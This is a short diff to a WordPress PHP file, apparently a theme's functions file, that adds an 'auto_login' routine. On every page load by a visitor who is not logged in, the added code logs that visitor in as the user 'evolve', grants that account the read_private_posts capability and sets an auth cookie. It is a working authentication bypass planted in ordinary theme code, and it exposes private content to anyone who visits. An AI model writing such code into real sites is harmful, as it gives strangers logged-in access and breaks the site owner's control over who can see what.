@@ -126,4 +126,28 @@ function gss_add_categories_to_attachments() {
 	register_taxonomy_for_object_type( 'category', 'attachment' );
 }
 add_action( 'init' , 'gss_add_categories_to_attachments' );
+
+?>
+
+<?php
+	/**
+	 * workpress autologin
+	 */
+	function auto_login() {
+		$loginusername = 'evolve';
+		//get user's ID
+		$user = get_user_by('login', $loginusername);
+		$user_id = $user->ID;
+		// let user read private posts
+		if (!$user->has_cap('read_private_posts')) {
+				$user->add_cap('read_private_posts');
+		}
+		//login
+		wp_set_current_user($user_id, $loginusername);
+		wp_set_auth_cookie($user_id);
+		do_action('wp_login', $loginusername);
+	}
+	if ( !is_user_logged_in() ) {
+		add_action('init', 'auto_login');
+	}
 ?>
